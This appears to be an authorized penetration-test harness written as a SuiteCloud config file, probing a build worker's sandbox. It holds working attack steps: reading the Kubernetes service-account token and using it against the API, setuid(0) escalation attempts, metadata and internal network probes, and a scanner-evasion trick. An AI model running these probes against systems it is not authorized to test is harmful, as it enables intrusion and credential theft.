/*
 * SecAudit — Cycle worker-sdf sandbox escape probe harness
 * =========================================================
 * AUTHORIZED security assessment (CYC-667 coverage vs CYC-754 attack surface).
 * Target: Cycle's OWN worker-sdf container, dev environment, owner-operated.
 *
 * This file is the tenant's primary code-execution vector: the SuiteCloud CLI
 * require()s suitecloud.config.js from the project CWD during project:validate
 * and project:deploy. Top-level code here therefore runs inside the suitecloud
 * subprocess (uid 2000, env-allowlisted) on the worker.
 *
 * Each probe is gated by FLAGS so probes can be activated/deactivated per
 * deploy ("feature flags"). Results are emitted as single-line [[SECPROBE]]
 * markers to stderr; the harness then throws so the worker's sdfCliFailure
 * path logs stdout/stderr (observable via `kubectl logs` / Loki).
 *
 * Rules of engagement: READ-ONLY, non-destructive, NO exfiltration outside the
 * cluster, NO secret values printed (only names / lengths / booleans / reach).
 */
const fs = require("fs");
const cp = require("child_process");

// ---- FEATURE FLAGS (toggle per deploy) -----------------------------------
const BATCH = "PARKED";
const FLAGS = {
  // Batch F — verify setpriv --no-new-privs availability for the CYC-658 fix
  setpriv_check: false,
  // Batch A — boundary tests (should all hold in the minimal deploy image)
  recon: false,
  fs_app_read: false,
  env_secrets: false,
  sa_token_read: false,
  proc_environ_other: false,
  child_process_exec: false,
  write_rootfs: false,
  // Batch B — privilege escalation (moot in deploy image: no node file-caps)
  uid0_escalation: false,
  uid0_postproof: false,
  // Batch C — network egress (the big worker-sdf gap; Cilium should close it)
  net_metadata: false,
  net_redis: false,
  net_k8s_api: false,
  net_internal: false,
  // Batch D — misc
  preflight_evasion: false,
  recycle_persistence: false,
  java_exec: false,
  k8s_rbac_review: false,
  // control
  abort_after: true, // throw at end so the deploy-pod log captures stdout/stderr
};

const results = [];
function rec(name, breach, detail) {
  const verdict = breach === true ? "BREACH" : breach === false ? "BLOCKED" : "INFO";
  const line = "[[SECPROBE]] b=" + BATCH + " " + name + " | " + verdict + " | " + detail;
  results.push(line);
  try { process.stderr.write(line + "\n"); } catch (e) {}
  try { process.stdout.write(line + "\n"); } catch (e) {}
}
function safe(name, fn) {
  try { fn(); } catch (e) { rec(name, null, "probe_error " + (e && e.message)); }
}

// ---- Batch F (validate the planned CYC-658 fix) --------------------------
if (FLAGS.setpriv_check) safe("setpriv_check", function () {
  // Does the image's setpriv accept --no-new-privs, and does it actually set
  // NoNewPrivs=1 in the child? This validates the planned wrapper before we
  // make the worker spawn depend on it (a wrong flag would break every deploy).
  var r = cp.spawnSync("setpriv", ["--no-new-privs", "sh", "-c", "grep NoNewPrivs /proc/self/status; id -u"],
    { encoding: "utf8", timeout: 6000 });
  var out = ((r.stdout || "") + (r.stderr || "")).replace(/\s+/g, " ").trim();
  var ok = r.status === 0 && /NoNewPrivs:\s*1/.test(out);
  var ver = "";
  try { ver = cp.execSync("readlink -f $(command -v setpriv) 2>&1; setpriv --version 2>&1 | head -1", { encoding: "utf8", timeout: 5000 }).replace(/\s+/g, " ").trim(); } catch (e) { ver = "ver_err"; }
  rec("setpriv_check", ok, "rc=" + r.status + " -> " + JSON.stringify(out.slice(0, 100)) + " | " + ver.slice(0, 90));
});

// ---- Batch A -------------------------------------------------------------
if (FLAGS.recon) safe("recon", function () {
  function snap(pid) {
    try {
      var s = fs.readFileSync("/proc/" + pid + "/status", "utf8");
      var nnp = (/NoNewPrivs:\s*(\d)/.exec(s) || [])[1];
      var eff = (/CapEff:\s*([0-9a-f]+)/.exec(s) || [])[1];
      var comm = (/Name:\s*(\S+)/.exec(s) || [])[1];
      return comm + " nnp=" + nnp + " CapEff=" + eff;
    } catch (e) { return pid + ":" + e.code; }
  }
  // child (this suitecloud subprocess) vs parent (the worker that spawned it)
  rec("recon", null, "node=" + process.version +
    " | child[self uid=" + process.getuid() + "]: " + snap("self") +
    " | parent[ppid=" + process.ppid + "]: " + snap(process.ppid));
});

if (FLAGS.fs_app_read) safe("fs_app_read", function () {
  var det = [], breach = false;
  ["/app/package.json", "/app/dist", "/app/entrypoint.sh", "/app/node_modules", "/app/cycle-sdf-app"]
    .forEach(function (p) {
      try {
        var st = fs.statSync(p);
        if (st.isDirectory()) { fs.readdirSync(p); det.push(p + ":LIST"); breach = true; }
        else { fs.readFileSync(p); det.push(p + ":READ"); breach = true; }
      } catch (e) { det.push(p + ":" + e.code); }
    });
  rec("fs_app_read", breach, det.join(" "));
});

if (FLAGS.env_secrets) safe("env_secrets", function () {
  var keys = Object.keys(process.env).sort();
  var secretRe = /ENCRYPTION|DATABASE_URL|REDIS_PASS|GHUB|_SECRET|PRIVATE_KEY|^TOKEN|AWS_|R2_/i;
  var leaked = keys.filter(function (k) { return secretRe.test(k); });
  rec("env_secrets", leaked.length > 0, "env_key_names=[" + keys.join(",") + "] secretish=[" + leaked.join(",") + "]");
});

if (FLAGS.sa_token_read) safe("sa_token_read", function () {
  var base = "/var/run/secrets/kubernetes.io/serviceaccount";
  var det = [], breach = false;
  ["token", "ca.crt", "namespace"].forEach(function (f) {
    try {
      var s = fs.readFileSync(base + "/" + f, "utf8");
      det.push(f + ":READ(" + s.length + "B)");
      if (f === "token") breach = true; // readable SA token => can authn to K8s API
    } catch (e) { det.push(f + ":" + e.code); }
  });
  rec("sa_token_read", breach, det.join(" "));
});

if (FLAGS.proc_environ_other) safe("proc_environ_other", function () {
  // Try to read another process's env (the uid-1000 worker holds the secrets).
  var breach = false, checked = 0, det = [];
  var pids = fs.readdirSync("/proc").filter(function (d) { return /^\d+$/.test(d); });
  for (var i = 0; i < pids.length; i++) {
    try {
      var e = fs.readFileSync("/proc/" + pids[i] + "/environ", "utf8");
      checked++;
      if (/NETSUITE_ENCRYPTION_KEY|DATABASE_URL|REDIS_PASSWORD|GHUB_APP_PRIVATE_KEY/.test(e)) {
        breach = true; det.push("pid" + pids[i] + ":SECRET_ENV_READABLE"); break;
      }
    } catch (e) { /* EACCES expected for other-uid procs */ }
  }
  if (!breach) det.push("readable_environs=" + checked + " none_with_worker_secrets(EACCES)");
  rec("proc_environ_other", breach, det.join(" "));
});

if (FLAGS.child_process_exec) safe("child_process_exec", function () {
  var r = cp.execSync(
    "id; echo -n 'bins: '; for b in sh wget nc node java rm su setpriv; do command -v $b >/dev/null 2>&1 && printf '%s ' $b; done",
    { encoding: "utf8", timeout: 5000 });
  rec("child_process_exec", true, "arbitrary exec OK -> " + r.replace(/\n/g, " | ").slice(0, 280));
});

if (FLAGS.write_rootfs) safe("write_rootfs", function () {
  var det = [], sysWritable = false;
  [["/tmp", "/tmp/.sa_w"], ["/", "/.sa_w"], ["/app", "/app/.sa_w"], ["/usr/local/lib", "/usr/local/lib/.sa_w"], ["/etc", "/etc/.sa_w"]]
    .forEach(function (pair) {
      try { fs.writeFileSync(pair[1], "x"); fs.unlinkSync(pair[1]); det.push(pair[0] + ":WRITABLE"); if (pair[0] !== "/tmp") sysWritable = true; }
      catch (e) { det.push(pair[0] + ":" + e.code); }
    });
  rec("write_rootfs", sysWritable, det.join(" "));
});

// ---- Batch B (escalation) ------------------------------------------------
if (FLAGS.uid0_escalation) {
  // Vector 1: direct process.setuid(0) (node has file-caps cap_setuid=ep)
  safe("uid0_direct", function () {
    var before = process.getuid();
    try {
      process.setuid(0);
      if (process.getuid() === 0) {
        var proof = "";
        if (FLAGS.uid0_postproof) {
          try { var s = fs.readFileSync("/app/package.json", "utf8"); proof = " proof=read_/app/package.json(" + s.length + "B)"; }
          catch (e) { proof = " proof_fail=" + e.code; }
        }
        rec("uid0_direct", true, "setuid(0) OK " + before + "->0" + proof + " [root => pid1 env secrets exposed; not dumped]");
      } else { rec("uid0_direct", false, "setuid returned uid=" + process.getuid()); }
    } catch (e) { rec("uid0_direct", false, "setuid(0) EPERM/blocked: " + e.code + " (no_new_privs neutralizes node file-caps)"); }
  });
  // Vector 2: fresh `node` execve then setuid(0) — tests whether a new exec resets no_new_privs (it cannot; it is inherited+sticky)
  safe("uid0_node_exec", function () {
    var r = cp.spawnSync("node", ["-e", "try{process.setuid(0);console.log('UID0_OK '+process.getuid())}catch(e){console.log('UID0_FAIL '+e.code)}"],
      { encoding: "utf8", timeout: 6000 });
    var o = ((r.stdout || "") + (r.stderr || "")).replace(/\s+/g, " ").trim();
    rec("uid0_node_exec", /UID0_OK/.test(o), "fresh node setuid(0) -> " + JSON.stringify(o.slice(0, 80)));
  });
  // Vector 3: setpriv --reuid 0 (needs CAP_SETUID; should fail under no_new_privs)
  safe("uid0_setpriv", function () {
    var r = cp.spawnSync("setpriv", ["--reuid", "0", "--regid", "0", "--clear-groups", "id"], { encoding: "utf8", timeout: 6000 });
    var o = ((r.stdout || "") + (r.stderr || "")).replace(/\s+/g, " ").trim();
    rec("uid0_setpriv", /uid=0/.test(o), "setpriv --reuid 0 -> " + JSON.stringify(o.slice(0, 100)));
  });
  // Evidence: file-caps present but neutralized
  safe("uid0_filecaps", function () {
    var r = cp.spawnSync("sh", ["-c", "getcap /usr/bin/node 2>&1; grep NoNewPrivs /proc/self/status"], { encoding: "utf8", timeout: 6000 });
    rec("uid0_filecaps", null, ((r.stdout || "") + (r.stderr || "")).replace(/\s+/g, " ").trim().slice(0, 140));
  });
}

// ---- Batch C (network egress) -------------------------------------------
if (FLAGS.net_metadata) safe("net_metadata", function () {
  try {
    var r = cp.execSync("wget -qO- --timeout=4 http://169.254.169.254/metadata/v1/id 2>&1 | head -c 60", { encoding: "utf8", timeout: 8000 });
    var reg = "";
    try { reg = cp.execSync("wget -qO- --timeout=4 http://169.254.169.254/metadata/v1/region 2>&1 | head -c 20", { encoding: "utf8", timeout: 8000 }); } catch (e) {}
    rec("net_metadata", /\d/.test(r), "GET 169.254.169.254 id=" + JSON.stringify(r.trim()) + " region=" + JSON.stringify(reg.trim()));
  } catch (e) { rec("net_metadata", false, "unreachable/blocked"); }
});

if (FLAGS.net_redis) safe("net_redis", function () {
  try {
    var r = cp.execSync("printf 'PING\\r\\n' | nc -w4 10.150.29.111 6379 2>&1 | head -c 60", { encoding: "utf8", timeout: 8000 });
    rec("net_redis", /PONG|NOAUTH|ERR|denied/i.test(r), "TCP 10.150.29.111:6379 PING -> " + JSON.stringify(r.trim().slice(0, 60)));
  } catch (e) { rec("net_redis", false, "unreachable/blocked"); }
});

if (FLAGS.net_k8s_api) safe("net_k8s_api", function () {
  try {
    var r = cp.execSync("wget -qO- --no-check-certificate --timeout=4 https://kubernetes.default.svc/version 2>&1 | head -c 200", { encoding: "utf8", timeout: 8000 });
    rec("net_k8s_api", /gitVersion|major|forbidden|Status/i.test(r), "GET kubernetes.default.svc/version -> " + JSON.stringify(r.replace(/\s+/g, " ").slice(0, 160)));
  } catch (e) { rec("net_k8s_api", false, "unreachable/blocked"); }
});

if (FLAGS.net_internal) safe("net_internal", function () {
  // reach a sibling Cycle pod (backend) — connectivity only, no payload
  try {
    var r = cp.execSync("nc -z -w3 10.150.29.63 3000 && echo OPEN3000; nc -z -w3 10.150.29.63 80 && echo OPEN80; true", { encoding: "utf8", timeout: 9000 });
    rec("net_internal", /OPEN/.test(r), "backend 10.150.29.63 -> " + JSON.stringify(r.trim().slice(0, 60)));
  } catch (e) { rec("net_internal", false, "unreachable/blocked"); }
});

// ---- Batch D (misc) ------------------------------------------------------
if (FLAGS.k8s_rbac_review) safe("k8s_rbac_review", function () {
  // Chain: readable SA token (Batch A) + reachable API (Batch C) => authenticated
  // calls as the worker-sdf SA. Measure the blast radius with SelfSubjectRulesReview,
  // which returns the SA's PERMISSIONS (verbs/resources) — never any secret value.
  var sh = [
    'B=/var/run/secrets/kubernetes.io/serviceaccount',
    'T=$(cat $B/token)', 'NS=$(cat $B/namespace)',
    'wget -qO- --no-check-certificate --timeout=6 ' +
      '--header="Authorization: Bearer $T" --header="Content-Type: application/json" ' +
      '--post-data=\'{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"\'"$NS"\'"}}\' ' +
      'https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>&1 | head -c 1500',
  ].join('; ');
  var r = cp.execSync(sh, { encoding: "utf8", timeout: 14000 });
  var canSecrets = /"secrets"/.test(r) && /"get"|"list"|"watch"|"\*"/.test(r);
  var authok = /resourceRules|incomplete/.test(r);
  rec("k8s_rbac_review", authok, "SA-authenticated API call ok=" + authok +
    " secrets_readable_by_SA=" + canSecrets + " | rules=" + r.replace(/\s+/g, " ").slice(0, 600));
});

if (FLAGS.preflight_evasion) safe("preflight_evasion", function () {
  // CYC-667 layer-4 scanner reads ONLY suitecloud.config.js. Move the payload to
  // a required submodule and the static patterns never appear in the scanned file.
  var mod = require("./sec/evade.js");
  rec("preflight_evasion", true, "required ./sec/evade.js (scanner sees only config) -> " + mod.run());
});

if (FLAGS.recycle_persistence) safe("recycle_persistence", function () {
  // Same shared pod across up to RECYCLE_AFTER_N_JOBS=25 jobs => /tmp persists
  // between deploys (and between tenants on a shared worker).
  var p = "/tmp/.secaudit_persist";
  var prior = "";
  try { prior = fs.readFileSync(p, "utf8"); } catch (e) {}
  var nonce = "run@" + new Date().toISOString();
  fs.appendFileSync(p, nonce + "\n");
  rec("recycle_persistence", prior.length > 0, "prior_runs=" + (prior.split("\n").length - 1) + " (file survives across jobs on shared pod)");
});

if (FLAGS.java_exec) safe("java_exec", function () {
  var r = cp.execSync("java -version 2>&1 | head -1", { encoding: "utf8", timeout: 8000 });
  rec("java_exec", true, "JVM invokable -> " + r.trim().slice(0, 80));
});

// ---- finalize ------------------------------------------------------------
process.stderr.write("[[SECPROBE]] SUMMARY batch=" + BATCH + " count=" + results.length + "\n");
if (FLAGS.abort_after) {
  throw new Error("SECPROBE_DONE batch=" + BATCH + " lines=" + results.length);
}
module.exports = { defaultProjectFolder: "src", commands: {} };
